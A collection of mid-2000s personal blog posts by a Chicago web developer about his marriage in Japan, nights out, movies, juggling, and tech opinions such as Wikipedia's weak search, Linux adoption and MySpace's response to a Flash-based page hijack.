                <p>So everything worked out and Hiromi and I were married on tuesday. It was really fun. and really barely more than signing a paper. which i liked quite a bit. Today we did the first part of the visa stuff. It was insane. and really crazy. totally stressful. government offices are annoying and really bureaucratic. i felt like i was in a <a href='http://imdb.com/name/nm0000416/'>terry gilliam</a> movie. hah. But we are almost done - and the next part doesn&#8217;t seem to be too much different than this part - just a bit more &#8220;official.&#8221;</p>

<p>Well i am off. I will of course update everyone with all that happened in a little bit. but in the meantime - chekc out the <a href='http://nata2.org/photos/album/tokyo-summer-visit/'>pictures</a>.</p>

                <p>So i am going to tokyo on thursday to visit <a href='http://www.hirominakazawa.com'>hiromi</a>. I am really excited and quite happy. <a href='http://www.hirominakazawa.com'>hiromi</a> and i have been dating for quite awhile and will be getting married on the 29th of august in <a href='http://www.pref.yamanashi.jp/global_net/index.jsp'>Yamanashi</a>. I am quite excited. I have kept this quiet - because well&#8230; it wasn&#8217;t totally official for awhile.. we haven&#8217;t actually been around each other to officiate things and well i didn&#8217;t want to talk about it too much before things go to the point were it was almost real.</p>

<p>So now that i am about to leave in a couple days i decided to break the news&#8230; hah. So now you know. so exciting. It has been a tulmultuous couple months. knowing. not blogging. holding it in. doing visa applications. trying to understand our countries fucked up visa system. and all that. but whatever the troubles it is totally worth it.</p>

<p>So the plan is as follows.. <a href='http://www.hirominakazawa.com'>hiromi</a> and i will be getting legally married <a href='http://www.pref.yamanashi.jp/global_net/index.jsp'>Yamanashi</a> with her parents and my dad helping (witnessing and all that). Then after that we get to play visa buddies and apply for her to live and work in the US. Then After she is back we will have a wedding somewhere in the states and a wedding somewhere in japan and a party in chicago. Excited!</p>

<p>So on friday Tag and <a href='http://www.callmejeffrey.com'>Jeffrey</a> had planned a secret surprise bacheloresque party for me. Cole and I met up with them at wabi around 10. Morgan, Scott, Beth and Alan were all there eating. So I hung out and had a couple drinks with them. Then we dropped Cole off and headed up to cobra lounge to meet up with some people. haha. I thought we were going to meet up with tags from elmer for his birthday. So we get there and I walk in all confidently and cool. Yea know. Like usual. and i head to the back room and i notice <a href='http://www.callmejeffrey.com'>Jeffrey</a> ordering a drink. and i glance around and see Jake and i am like.. &#8220;wtf, Elmer apparently has the same friends i do.&#8221; Then i noticed that it was a LOT of my friends. not just a couple. And i started to really get suspicious. Then it dawned on me. In an amazing way. that i was at a surprise party for me.</p>

<p>That was a nice feeling. So then i hung out. Saw all my friends. Drank some champagne and basically just did my thing. Tag and <a href='http://www.callmejeffrey.com'>Jeffrey</a> had this vicious plan to take me to crobar where Claudia had hooked up a bundle of drink tickets and comp VIPs tickets for the group. Then to get really drunk at Red Hair Matt&#8217;s area. and then get our comp tickets and go to the strip club and yea know.. see strippers. fun fun.</p>

<p>But apparently the gods were looking down upon chicago that night and decided that i wasn&#8217;t to get retarded drunk and look at crazy not so hot naked girls - because as soon as we arrived - there was an explosion and all of the lights on the block went out. Crobar, Zentra, Vips the works.. Amazing. The best part about it was that the transformer that exploded - exploded right above Tags car. And across the street from <a href='http://www.callmejeffrey.com'>Jeffrey</a>&#8217;s car. hah. crazy. so we stood by for a minute and decided to go to redno. It turned out to be a great night. A lot less crazy than tag wanted. but really nice none the less.</p>

<p>So there it is. I couldn&#8217;t really hold it in any longer. Excitement. lots and lots of excitement.</p>

<p>Thanks to everyone who has supported me on this. Especially hiromi - for dealing with all my insanities and what not. It will be a fun time.. the future..</p>

                <p>So i took my mom and my cousin cole to see <a href='http://imdb.com/title/tt0415306/'>Taladega Nights</a> at the AMC downtown. They liked it and thought it was a hilarious movie. but that wasn&#8217;t the crazy part. The crazy part was in the beginning. We were all sitting their watching the movie chilling out and what not and i shifted in my chair and accidently bumped the chair in front of me. I mumbled an apology and then sat back. The woman looked back - so i apologized a bit more. then she got up and looked at me more. Then the person she was with was like &#8220;hey don&#8217;t worry about it&#8221; and she said &#8220;i will take care of this.&#8221; She then went behind me and sat behind cole. Very aggressively. hah. and then after a minute or two - she kicked coles seat really hard and kicked my seat. then she poured her coke on me. hahaha. i was like wtf. but didn&#8217;t do anything. i didn&#8217;t want to give her any rise - no satisfaction for her anti social anger. Everyone around us was really pissed. Her and her partner left and she was really mad. yelling in the hallway and what not. insane.</p>

<p>So then a security guard/tough looking employee came up to me and was like &#8220;why didn&#8217;t you apologize after you bumped her&#8221; and i responded &#8220;i did apologize and then she poured her soda on me.. wtf..&#8221; and he was like &#8220;whatever&#8221; and left.</p>

<p>Then awhile after that another person came - obviously higher up in the AMC organization and asked me to step in to the hall. I refused and told her that i didn&#8217;t think i was at fault and that she was obviously insane. So then the lady was kinda insistent and the woman behind me stepped in and explained from her perspective what happened. Hilarious. So she mentioned all of the events and i was like &#8220;yea. she stomped around.. bumped our seats and then poured coke on me.. &#8221; and the woman behind me was like &#8220;yea and it splashed on me.&#8221; So then leaned in to tell me something and felt the soda all over the chair next to me and felt my shirt. and she finally believed us. So she was like &#8220;i am so sorry..&#8221; and left us alone. haha.</p>

<p>Insane. Tag suggested i should have made a bigger scene when she poured the soda on me. and i partially agree. but i felt that she obviously wanted a confrontation and that i didn&#8217;t want that. I just wanted to watch the movie with my mom and cousin. not be bothered by an annoying insane person. I also didn&#8217;t want her to have the satisfaction of fucking with our movie experience. hah. i showed her.</p>

<p>besides pop isn&#8217;t that bad to get out of a shirt.. even if it was my <a href='http://www.rockersnyc.com/'>rockers nyc</a> shirt.</p>

                <p>So today after running some errands downtown i came home and about died. I slept like a baby until around 10. confused and hungry i awoke. I felt like hell still. which sucked. I was totally (totally dude) supposed to go to a bbq around 7. But i just didn&#8217;t have it in me. and now its 11:39 and i am still achey and tired.</p>

<p>However, after i ate and chilled for a minute, i decided to try the neti pot again. and this time it wasn&#8217;t as rough as the first time - however it still was rough. It is fun though to watch all the water come through your nose. hah. and i really do love how i can breathe better through my nose now. w00t w00t. maybe i am a convert.. hmm.. i think it still is a bit uncomfortable.</p>

<p>I just don&#8217;t want to be sick at all when i go and visit hiromi. that would be sad. so early to bed. early to rise. good food to eat. and no stress for the next week.</p>

<p>My mom is coming into town this weekend with my cousin, cole. i am excited. more on that later..</p>

                <p>i am pretty sure i was a bit tipsy when i wrote my last rant/entry. hah. but nobody knows. i can&#8217;t possibly imagine that it makes a whole bundle of sense.</p>

<p>Last night i watched &#8220;Lost in translation&#8221; and a bit of &#8220;Endless Sunshine of a blah blah blah.&#8221; Tonight i am watching &#8220;Jesus&#8217; Son.&#8221; Such great movies. I really love Jesus&#8217; Son. I think it may be one of my favorite stories. I have had a harder time with denis johnson&#8217;s other books - but they are all good.</p>

<p>I like the sadness and sorrow that are in all of those movies. especially jesus&#8217; son. The movie is amazing.</p>

<p>Work has been pretty crazy right now. we just did our big move. and we are about 90% done. it has been a tumultuous time. but rackspaces support is amazing. amazing. i was totally surprised. its insane. i was talking to a person who was helping us fix our servers at 4:00am. they were happy to help us. hah. awesome.</p>

<p>that makes things much easier.</p>

<p>i leave for tokyo soon. i am quite excited. big news and life changing events. i bet you can&#8217;t guess. ;) wait. i bet most of you can. hah. hiromi and i rule. RULE!</p>

<p align='left'><small>Just a warning to all who would read this - i think i was a bit tipsy when writing it. so it is very very ranting and probably doesn't make sense.</small></p>
</blockquote>
<p>I have been playing around in my head with scenarios of what must happen when an organization which has a philosophy of using only open source suddenly finds itself in need of a closed source solution. This seems to me to be an interesting quandary for the poor open source only people.</p>

<p>I think that possibly a need would arise where an organization would find that their open source solution is not possibly giving the same results as a closed source solution. I could see this being the case for application servers, or search engines, or possibly even a framework or something. Probably things where money equals performance. For my example i will use a search engine - since that is what my background is.</p>

<p>It seems to me that using closed source is obviously contrary to a philosophy of open sourcism (hah). But i feel that possibly publicly challenging the open source world by saying &#8220;Hey - we do not want to use this closed source product, but we are forced to because the open source solution plane does not offer the performance that we need.&#8221;</p>

<p>I would hope that this transparent admission of the difficulty of the situation would engage the community surrounding your site or application to support a competing open source solution and hopefully foster that solution so that one day it will be competitive.</p>

<p>I think a good example of the level of application i am looking for is JBOSS. This is an open source application server that started small and became a competitor. Sure it isn&#8217;t as fancy or fast as web-logic - but it seems be a contender when choosing a java application server.</p>

<p>I started to think about this a lot when i was talking with some people about my feelings about endeca search and wikipedia. A couple of them brought up the point that endeca is closed source, and owns patents (which is apparently the most evil of thing to do when dealing with open source). The suggested issue is whether a company like wikipedia - which is built on entirely open source solutions (i think) would have a problem philosophically using a closed source (and patent full) solution like endeca.</p>

<p>In my musing with myself - i thought about whether they would do well to publicly call for solutions. Not like an RFP. Something were the board would take a look at some solutions - much like a company would look for a search engine. and decide which solution would be best or easiest. All of this being very open and transparent. Allowing open source solutions to compete as well as closed source solutions. This would allow the community to be the judge of what is best for wikipedia. And would show them where the level of open source search community is. and allow them to set a bar that would set the goal of open source search.</p>

<p>I really can&#8217;t imagine an open source search engine that would be up to par with endeca or really any commercial search engine. So it seems that the community surrounding wikipedia would benefit from being able to use a good solution for search. and the open source search engine technology would benefit from having a potential goal for their development.</p>

<p>I am sure this is convoluted. and probably not sound. but it was some ranting my mind was doing to itself and i wanted to make sure that i figured it out.</p>

                <p>So i was playing computer and a spider crawled down my screen. It was really little. really really little. but now that it has disappeared i feel it crawling all over my body. heh.</p>

<p>I think my favorite new movie director is <a href='http://imdb.com/name/nm0327273/'>Michel Gondry</a>. I was not aware that he was a drummer. Apparently he played drums on a Kanye West track. Amazing. His new movie looks quite nice. <a href='http://imdb.com/title/tt0354899/'>Science des rves, La</a>. It looks like a combination between Baby Snakes and a nice indie love movie. But as per Gondry&#8217;s usual it is going to be crazy. I really can&#8217;t wait to see it. Hopefully i will see it with hiromi.</p>

<p>I am going to tokyo to visit hiromi in 2 weeks. It wil be awesome. My father is coming with me this time. It will be fun. We have two unsupervised days in tokyo to get into trouble. It will be quite entertaining. I promise you all.</p>

<p>Last night was rather entertaining. I went to see Marcus Monroe&#8217;s juggling show in milwaukee. It was pretty awesome. <a href='http://www.markhayward.net/'>Mark Hayward</a>, <a href='http://www.marcusmonroe.com/'>Marcus Monroe</a>, Lana and <a href='http://www.buildingweight.com/'>Jay Gilligan</a> were amazing. I didn&#8217;t really like the music all that much - it was good, just not my thing. However, the italics owned. They were good. The magician. eh. not my thing either. but the juggling owned.</p>

<p>And i talked to a nice person named peggy who told me that the boulder juggling club is awesome. So dylan. you have no excuse to not get really good at passing.</p>

                <p>Tonight while talking about my crazy hair in high school and showing my roommate chris some pictures from high school i stumbled upon all my old tickets from concents and what not from the past 16 years. I apparently have gone to an ass load of concerts. Maybe over 150. It was surpriseing to look at all of these tickets and realize that i have spent at least 3 hours if not more time per piece of paper. that is roughly 450 hours of music - a lot of it death metal. haha. awesome.</p>

<p>One thing that is pretty funny for me - is all the tickets i have where i didn&#8217;t make it to the concert. I have not made good choices in regards which concerts i didn&#8217;t go to. For instance, i went to 3 cannibal corpse concerts but i didn&#8217;t make it to the sonic youth show with guided by voices. Or i ended up seeing busta rhymes twice but i missed lyrics born. Or i saw appleseed cast but i didn&#8217;t take the time to see white stripes. haha. The worst one - was when i accidently didn&#8217;t go see built to spill. I was at dinner at my friend lavi&#8217;s house and i we had just finished eating dinner. We were all hanging out and i noticed a friend wasn&#8217;t there (in retrospect it could have been my now coworker jeffrey - but i am not quite sure - and my memory is hazy surrounding all things lavi). Anyway, i remember asking where he was and they were like &#8220;oh. at the built to spill concert.&#8221; Well i was quite surprised. because i LOVED built to spill then. LOVED. like my favorite band. so missing it was quite a bummer. But not only missing it - but completely forgetting. man. i was bummed. but.. luckily for me.. i was able to keep cool.</p>

<p>Heh. i was doing this sporadically enough that i had to stop buying tickets. haha. so now i need a calendar. and usually someone else buys the tickets and keeps me in line. haha. man. sometimes i am retarded. but luckily not retarded enough to lose my fingers while juggling knives.</p>

<p>wtf.</p>

<p>exactly.</p>

                <p>So <a href='http://www.wikipedia.com'>Wikipedia</a> is getting <a href='http://www.andycarvin.com/archives/2006/08/jimmy_wales_announce.html'>a lot of</a> <a href='http://www.boingboing.net/2006/08/04/whats_next_for_wikip.html'>coverage</a> for all of the doings of the wikimedia foundation (<a href='http://laptop.org/'>$100 Laptop Partnership</a>, <a href='http://en.wikibooks.org/wiki/Wikiversity'>Wikiversity</a>, Wikiwyg). A lot of amazing stuff. And not only amazing - but helpful and really community friendly. I think that <a href='http://www.wikipedia.com'>Wikipedia</a> is really in a place to change the world. However - with that said - I think they need to concentrate on a part of their site that is integral:<strong> the search</strong>.</p>

<p>So I worked at an encyclopedia company for years. I did technology and software there. I was part of a search initiative and helped make the decision to move from IBM&#8217;s <a href='http://www-306.ibm.com/software/data/iminer/'>intelligent miner for text</a> to a modern and quite innovative search engine called <a href='http://endeca.com/'>endeca</a>. The difference in how our users were able to use our sites between the old search engine and the new search engine was incredible. We were able to completely change how people viewed our data - and was able to show the user a casual aggregate of the data that matched their search. Since we were targetting children - we were able to leverage stemming and spellchecking to give our users one of those &#8221;<a href='http://www.google.com/search?q=amaizng+grace'>did you mean</a>&#8221; experiences that is so common and well known in the search business. We made it so that the users didn&#8217;t have to work hard to get what they wanted. We gave them a lot of opportunities to find and more importantly stumble upon what they want.</p>

<p>We attempted to recreate the ability to browse the encyclopedia through a guided search. It was awesome. The users loved it and we continued to have a successful encyclopedia site.</p>

<p>So I feel very strongly about this topic. And i feel that <a href='http://www.wikipedia.com'>Wikipedia</a> is failing at providing their users a proper way to search their content. It seems to me the one thing that would make <a href='http://www.wikipedia.com'>Wikipedia</a> unstoppable was makign all of their content be available to normal people. Not people that can spell correctly, not people who know exactly what a dragon fruit is - and more importantly not people who know the titles of the articles. <a href='http://www.wikipedia.com'>Wikipedia</a> needs to make it so that their users can search intelligently and search not intelligently. They need to allow people to search on concepts (based on word frequency or even another crazy concept), they need to allow people to engage the encyclopedia like you would a book. Flipping page by page - but also being able to look up something. and expect to find it. Right now - the interwiki linking is amazing - but that coupled with a proper search would make <a href='http://www.wikipedia.com'>Wikipedia</a> an outstanding site.</p>

<p>My concern is partially inflated based on reading that they are partnering with the laptop.org $100 laptop people. They are expecting children and developing nations to use <a href='http://www.wikipedia.com'>Wikipedia</a>. But how are these underprivlidged people going to find what they are looking for if the search is poor. They need better search. They need common search abilities. They need things like spell checking and stemming. They need an intelligent search. They don&#8217;t need what <a href='http://www.wikipedia.com'>Wikipedia</a> current is offering.</p>

<p>So why doesn&#8217;t a search company offer up some servers, licenses and implementation as a donation to wikipedia? We can all see how it would better everything - and they would be a HUGE client. You could go into a sales meeting and point to one of the biggest sites on the internet and say &#8220;yea.. we power that.&#8221; Everyone would win. Think of the children. THE CHILDREN! So if you are in a search organization or you have some power - please push wikipedia to make their search better.</p>

                <p>Well&#8230; not me per se - but one of my websites. I don&#8217;t really know which one, but judgeing from what i have heard - i think they talked about my <a href='http://flashandburn.net/flickrtools/'>flickr myspace badge</a>. This is the second time i have heard about being in wired. The <a href='http://nata2.info/?path=pictures%2FIncoming&img=audrey_wired.jpg'>first</a> was for <a href='http://www.audreyhacking.com'>audreyhacking.com</a> and i don&#8217;t think i even saw that one for real. Only for fake. Wow. So if anyone has a scan of the mention - email it to me. I need it!</p>

<p>Recently i have been attempting to pair down my domain name collection. Nothing is more sad than letting a domain name drop - but nothing is more annoying than paying 100 dollars each month on crappy domain names. wtf. haha. so i am dropping such good domains as &#8220;drugpenismachine.com&#8221; and whatnot. I know. i am missing the profits for sure. I should wait until the FDA approves that machine and i would be RICH. RICH I TELL YOU!</p>

                <p>so i am not a large person. i am no where near little either. I grew up really skinny and just in the last few years have gained weight. Recently i noticed that i gained a belly. Not the ironic funny belly - but a legit paunch. I don&#8217;t really want a paunch - and after talking to some friends who are quiet well taken care of they mentioned that it most likely is the fact that i snack a lot and drink about 300 pops a day. So i am trying something different.</p>

<p>I am going to try and not drink pop for a month and not snack as much. I have never in my life attempted such a feat. I have always eaten what i want when i want. so this will be quite an interesting move.</p>

<p>heh.</p>

                <p>So this weekend was awesome. Kile and my mother flew in on thursday and we met up for dinner. They went to cirque du soliel and i went to juggling. Then on friday - i picked up my cousin kile at his hotel and we went to my work. He caused trouble and played xbox. I worked on our new secret project. After work - we went to sushi wabi and then kile went and played in the fountains in millenium park. He seemed to like how crazy it was.</p>

<p>Then on saturday we met up a little later then i wanted (i had accidently stayed out all night long on friday). We met up downtown and went to chinatown for lunch. We went to Joy Yee and had some great fun food and smoothies. I love their smoothies. So smooth. After joy yees - we helled about chinatown and then went back downtown. I went and got my hair did while my mom and kile went and watched the movie Cars. We then met up for a nice dinner at rezas with matiss. Then we went and hung out at matiss&#8217;s apartment and juggled.</p>

<p>On sunday - we went to lunch at boston blackies then we went to the nokia store and then the lego store where kile got the biggest lego set ever. After that we went to navy pier. I hate navy pier - but it was fun to hang out. Then we rented a 4 person bike and rode it around. Afterwards we went and had dinner and then went up to the hotel room to play legos.</p>

<p>I went home and promptly fell asleep in my hot hot room.</p>

<p>it was a great weekend. and i had a lot of fun.</p>

                <p>So i think it is awesome that <a href='http://sethgodin.typepad.com/'>seth godin</a> was able to "<a href='http://video.google.com/videoplay?docid=-6909078385965257294'>convince</a>" google to give <a href='http://joelonsoftware.com/items/2006/07/28.html'>joel on software a google search appliance</a>. That is amazing. I mean - Joel probably needed a better search engine, but what makes me mad is this:</p><p>Wikipedia needs a better search engine more than joel on software needs a better search engine. Wikipedia is probably one of the coolest sites on the internet right now. It allows such a diverse array of content editors and knowledge holders. The articles are well written and quite good. Of course their is a couple problems with quality and truth - but for the most part the allowance of anyone to edit keeps the truth breakers in check. So you have this amazing website that is revolutionizing content creation on the ole' internet and it has one giant problem - nobody can find a damn thing because the search is so fucking shitty. Seriously. Go to <a href='http://www.worldbook.com'>worldbook.com</a> (my former employer - where i helped implement search) and make a search for "<a href='http://www.worldbook.com/wb/Search?st1=wolrd+war+2&x=0&y=0'>wolrd war 2.</a>" Now goto to <a href='http://www.wikipedia.org'>wikipedia</a> and do the same search "<a href='http://en.wikipedia.org/wiki/Special:Search?search=wolrd+war+2&go=Go'>wolrd war 2.</a>" WTF. Why is "<a href='http://en.wikipedia.org/wiki/Medieval:_Total_War_Cheats' title='Medieval: Total War Cheats'>Medieval: Total War Cheats</a>" the first result. Why is it that their is no spell checking of search terms? Why does the number one encyclopedia have the number shit search engine. How do they expect to appeal towards children, parents and other wayward internet users if their search isn't intuitive and makes finding what you are looking for hard to do. How can you "browse" the encyclopdia?</p><p>Anyway - this leads me to why i am mad at <a href='http://joelonsoftware.com'>Joel on software's</a> new google search appliance.  Why doesn't google help wikipedia. I am sure that their is more to it than just them throwing a 5k box at wikipedia. But my point is this - why is joel on software being talked about as having bad search when the real issue is at the heart of the "<a href='http://en.wikipedia.org/wiki/Web_2'>web 2.0</a>". Oh sure - us coders love to be able to find joelonsoftware search results fast and easy. I mean. i love JOS and really enjoy reading his writing; and being able to search his writing is helpful. I am sure that google took seths advice and thought "lets flip the funnel and give joel a mini - this way he will blog about and everyone who has a large blog will want to buy and license a mini." Great. Awesome. Meanwhile the internet is dieing and children can't find their content - but coders can.</p><p>I think i am missing the point of joel getting a search appliance. I admit that. But i am still pissed that i can't search on wikipedia and that i can on Joel on software. I mean wtf.<br />
Can someone <a href='http://sethgodin.typepad.com/seths_blog/2006/01/flipping_the_fu.html'>flip the funnel</a> and buy <a href='http://www.wikipedia.com'>wikipedia</a> a freaking search engine (<a href='http://www.endeca.com'>ENDECA</a>!)!

<p>This is really confusing. What is more confusing is that the sign telling the user where to swipe their card is on the other side of the door. So you can&#8217;t see where you are supposed to swipe your card until after you enter the bus and pass the RFID terminal. So when a newb enters the bus and looks for the place to enter their card - they can&#8217;t find it. and often are stuck in a line with a regular card user. It sucks and is annoying. It also leads to weird awkward situations where the &#8220;fast RFID type card&#8221; user cuts in line to speed up the entire process. But this doesn&#8217;t really go over well with the more aggressive user and can cause some interesting altercations.</p>

<p>What is even more annoying is that on the older buses - the terminal is in the same place for both the RFID cards and the regular swipe cards. This seems intuitive. However - with the new redesign - they have moved it and killed any efficiency that they had.</p>

<p>Stupid cta.</p>

<p>It rules. and is hilarious. I have received a lot of messages saying &#8220;did you get lacek?&#8221; apparently seeing forever is part of getting lacek. I also got a bunch of responses asking me if i was on drugs. Most people thought i had smoked up crazy and got ahold of my phone. but as all of you know i don&#8217;t use drugs. so it couldn&#8217;t have been that. Then quite a few people asked where i was - this is an amazing question. Where would i be if i could see forever. Sadly i wasn&#8217;t really anywhere. hah. The best response thus far was &#8220;How rad.&#8221; It was.</p>

<p>Anyway, tonight i went and saw the sludge/stoner rock band called <a href='http://www.swordofdoom.com/'>The Sword</a> at the <a href='http://subt.com'>subteranean</a>. It was amazing. They are quite amazing. AMAZING. We are going to see <a href='http://www.3inchesofblood.com/'>3 inches of blood</a> next tuesday. Which is going to be more amazing. come with us.</p>

                <p>So this weekend was pretty fun. I just worked a bunch. Finished some stuff and played around a lot. I didn&#8217;t really go out much. On friday, Chris, Tag and myself went to see <a href='http://imdb.com/title/tt0383574/'>Pirates of the Caribbean: Dead Man's Chest</a>. It wasn&#8217;t too good or bad - but <a href='http://imdb.com/name/nm1742061/'>Cecil's face</a> was in it. that ruled. Afterward we went to Y bar and crobar. Simple night really.. On saturday i just hung out. Played computer. yea know. the usual. Today i rode my bike to <a href='http://www.therats.org'>Matiss's</a> house and juggled a bunch. We are doing a juggling performance in a couple weeks so we need to practice. It was a great time.I really miss juggling regularly. It is such a relaxing and repetitive sport. hah. Awesome.</p>

<p>In one month i am going to tokyo. I am really excited. Going to see <a href='http://www.hirominakazawa.com'>hiromi</a>. I miss her quite a bit - so it will be nice to see her. Of course. I really don&#8217;t like how much it costs to fly to japan - but it has given me an ass load of frequent flyer miles - maybe it will make it so my next flight is free. punks. Much much more on this later.. i bet you can guess. but i will leave it at that for now ;) This week is going to be insane at work. I know it. So much stuff going on. We will be being crazy of course. stay tuned..</p>

                <p>I use a lot of operating systems in my daily computing exercise, each one does its own thing. I use windows for development - which really means that i just use windows for putty and firefox. I use linux to host and write code. and i use OSX for personal information management. Today i am going to tell yall how i use the i-suite and <a href='http://calendar.google.com/'>Google Calendar</a> to have my calendars accessible all the time.</p>

<p>First off, I need to exercise some disclosure. I am not a OSX user. I don&#8217;t know all the tricks and i totally don&#8217;t know how to use OSX to its best. However, i will totally own a system if i can figure out a reason to (i say own in the gamer sorta way..). The reason i got a OSX box is to sync with my symbian phone. I loved the ability to back up my addressbook at a moments notice and to transfer my contacts from one phone to another. It was awesome. and as a side effect - i had ical sync as well. So that is where this starts.</p>

<p>So we start with <a href='http://www.apple.com/macosx/features/ical/'>iCal</a>. iCal is a sweet simple calendaring application. I have a couple calendars set up that i use. One is home, another is travel and the other is work. These three calendars i then publish to <a href='http://www.icalx.com'>icalx.com</a>. I use icax because it is the easiest and the because its free. I have ical automatically publish changes at all time. I do publicly share my calendars - i figure that i am practiceing the &#8220;security through obscurity&#8221; model with my calendars - hopefully nobody will look. I share my calendars so that i can import the shared icalx url for each calendar into <a href='http://calendar.google.com/'>Google Calendar</a> and view all my events per individual calendar.</p>
<a href='http://calendar.google.com/'>Google Calendar</a>
<p>Right now we have <a href='http://calendar.google.com/'>Google Calendar</a> events in ical and ical events in <a href='http://calendar.google.com/'>Google Calendar</a> - however both pathways are read only. This is annoying and i can&#8217;t really figure out how to fix that. But i don&#8217;t think it really matters. Because i don&#8217;t use <a href='http://calendar.google.com/'>Google Calendar</a> or ical as my only input or output - and i mostly use my phone. Which is where this entire system really shines.</p>

<p>Using isync - i can sync all of the events from <a href='http://calendar.google.com/'>Google Calendar</a> and ical onto my phone. w00t. so if i enter an event into <a href='http://calendar.google.com/'>Google Calendar</a>, i can see it on my phone after a sync. that rules. The only thing that is annoying is that if you attempt to edit an event on the phone that orginates from <a href='http://calendar.google.com/'>Google Calendar</a> - you will get an error about modifying a read only event. that sucks. so their are some bugs. but.. it works really well for me. and with all the new <a href='http://www.s60.com'>symbian phones</a> really trying hard to be PIMs it is quite awesome.</p>

                <p>AHAHA. i loves swearing.</p>

<p>I was just perusing digg and found this article on newsforge: <a href='http://os.newsforge.com/article.pl?sid=06/07/17/1535230&from=rss'> Why Linux isn't mainstream</a>. It has some good points but i don&#8217;t really understand where this person has been for the last 3 years. Of course linux isn&#8217;t mainstream. The only mainstream OS is the OS that runs the consumer desktops. This is because the &#8220;suits&#8221; are not the technologists. They are basically &#8220;architects,&#8221; designing solutions and architecting systems from 1000 feet. It is not their place to know the best actual solution for the actual problem. that is for us the implementers to know and act on. They are little more than actors . They rely on our input and output to make decisions. So without us advocating &#8220;outlook ripoffs&#8221; then they will of course pick the closest thing they know - which is the consumer OS and that OS&#8217;s related products. They don&#8217;t know linux - because they don&#8217;t see it when they check their email. when they browse for porn and when they check golf and sports scores. My point is this - often business decision makers are not technologists and if they just blindly rely on what they know - they will make decisions on what they are compfortable with, not what their technologists are comfortable with.</p>

<p>Besides that, I do not think that linux is all that unknown in the business and technology world. I would say its quite the opposite. I think it is a very viable solution to a lot of rather common problems. and us IT workers know it. All the places i have worked have used some form of linux solution in their institution. that is mainstream. I didn&#8217;t alway work at small startups. I worked at a large publishing company and huge ad agency. both places used linux for their solutions. Both liked linux. Both would use it again. I guess my general problem with the newsforge article is that he is saying linux isn&#8217;t mainstream from a consumer OS point of view. I think it is mainstream, but it isn&#8217;t a consumer OS. Hmm. stupid vocabulary.</p>

<p>For instance this last weekend(07/15/2005) someone had exploited flash and myspace to make a <a href='http://mashable.com/2006/07/17/myspace-hacked/'>script that hijacked peoples pages</a> and placed unwanted code in their &#8220;about me&#8221; section. It was a simple hijacking, using a known flash exploit/feature, exploited by malicious users and it worked. Myspace got mad and in response upgraded all their flash to flash 9. This is all fine, but what pissed me off was how they reacted to their users. After the weekend when you logged into myspace - they redirected you to a <a href='http://vids.myspace.com/index.cfm?fuseaction=vids.upgrade'>flash upgrade page</a>. The text of the page read: <blockquote>hey folks - we are moving myspace music players and video players to flash 9.0. flash 9 has security fixes so that people can't mess with you on myspace. <strong>if your 'about me' got screwed up this weekend, you could have been safe if you had flash 9 installed. </strong>here's an easy way to install it, go watch this dashboard video i posted last week. if you don't like dashboard, just watch any video in our video section, and you'll be prompted to install flash 9.</blockquote> As you can see - myspace blames its users for their security issue. I mean - it is a pain in the ass when you allow users to post whatever they want. That is a really hard thing to manage and XSS stuff is hard to solve for and very hard to predict. However - it isn&#8217;t the fault of the users that someone exploited a new flash exploit. hah. in fact i would say that it is the fault of myspace.</p>

<p>After this happened i started to look around and a lot of the language on myspace(the little &#8220;friendly&#8221; messages from tom, the notices and other user interaction) is all a bit passive aggressive. Its like a friend who you like but always blames you when things go wrong. hah. stupid myspace</p>

                <p>So tonight i have been playing with <a href='http://www.sixapart.com/'>Six Aparts</a> VOX blog service. Besides the confusing name (probably only confusing to me - the alcoholic podcaster) <a href='http://www.sixapart.com/'>Six Aparts</a> social network blog thing is pretty cool. Check out my profile <a href='http://nata2.vox.com/profile/'>here</a> and my &#8220;blog&#8221; <a href='http://nata2.vox.com/profile/'>here</a>. I like the idea behind the <a href='http://www.vox.com/'>VOX</a> social network. I have long thought that <a href='http://www.sixapart.com/'>SA</a> is pretty smooth at executing products. The Movable Type platform was always nice looking and easy to use. <a href='http://www.vox.com/'>Vox</a> is very similar. It is pretty. Smooth. Ajaxy in the right places. and generally feels like a social application. I really like how they are trying to be interoperable between different services(<a href='http://www.amazon.com'>amazon</a>, <a href='http://www.flickr.com'>flickr</a>, <a href='http://www.photobucket.com'>photobucket</a>, etc) and i enjoyed putting some books and what not into their system. I was annoyed they couldn&#8217;t just look up my youtube videos by my username and that i have to grab pictures from my flickr photostream and place them by hand into <a href='http://www.vox.com/'>VOX</a> - it seems that with some simple modifications they ultimately could become a very nice aggregate social network. allowing users to view and interact with all your bits and pieces from around the internet.</p>

<p>One thing that really is starting to piss me off is this &#8220;lets start a new blog&#8221; bullshit. WTF. I have had the same blog since 1999/2000. I don&#8217;t want a new blog. In fact i hate new blogs. One of my pet peeves is when people change blogs like they change clothes. It doesn&#8217;t make sense in my head. So why would i start a new blog if i already have my own. Why doesn&#8217;t <a href='http://www.vox.com/'>VOX</a>, <a href='http://360.yahoo.com'>360</a>, myspace just import my rss feed. I would love to have more people intereact with my posts. i just don&#8217;t want to write 4 posts for 4 blogs. i can barely keep up with this one.</p>

<p>I would sign up for vox if you have a chance. I like it. I will maybe keep updating it. Especially if it becomes easier and easier.</p>

<p>On a completely different note. Can someone invite me to share a <a href='http://www.writely.com/'>writely</a> document. I really want to check out that product. I just started to using google <a href='http://spreadsheets.google.com'>spreadsheets</a> and i would love to start using writely.</p>

                <p>So we don&#8217;t have air conditioning. I mean. we have one small unit that sits in our living room and makes watching television somewhat bearable - but we don&#8217;t have central air or even something close to that. So we die. It is honestly around 100 degrees in my room. as you can imagine that makes it pretty hard to sleep.</p>

<p>Rough.</p>

<p>One thing i have done to combat the heat is drink a lot of water and sleep on a towel. haha. And fall asleep in the tv room.</p>

<p>haha. busted.</p>

<p>So today was pretty fun. We have a bunch of cool stuff brewing at work. i am excited for the next two and a half months. stay tuned for some <a href='http://www.nakedandangry.com'>cool</a> <a href='http://www.needshelp.org'>stuff</a> from skinnycorp. After work we went and looked at clothes. a fun little field trip. Good stuff those clothes stores. ;) the craziest store is that akira store. I used to hate it - but it has grown into something that is entirely different than it used to be. its really cool and apparently owns wicker park on north avenue. i picked up a couple really cool shirts. all apocalypse stuff. After that i parted ways with jeffrey and ross and went home. Then a minute later i ran to irazu and had dinner with scott and andy. Andy is at CMU for fancy computer science stuff and it is always refreshing to talk to him about whats up in his world. And scott is CIO of some bank. hah. that shit is hilarious. REAL PEOPLE. but we ate the good food of irazu, had their shakes and drank a lot of beer. i was partially drunk. one thing for certain - irazu+passion fruit shake+ beer+100 degrees makes my stomach loopy. totally wacko. i, in fact, just recovered.</p>

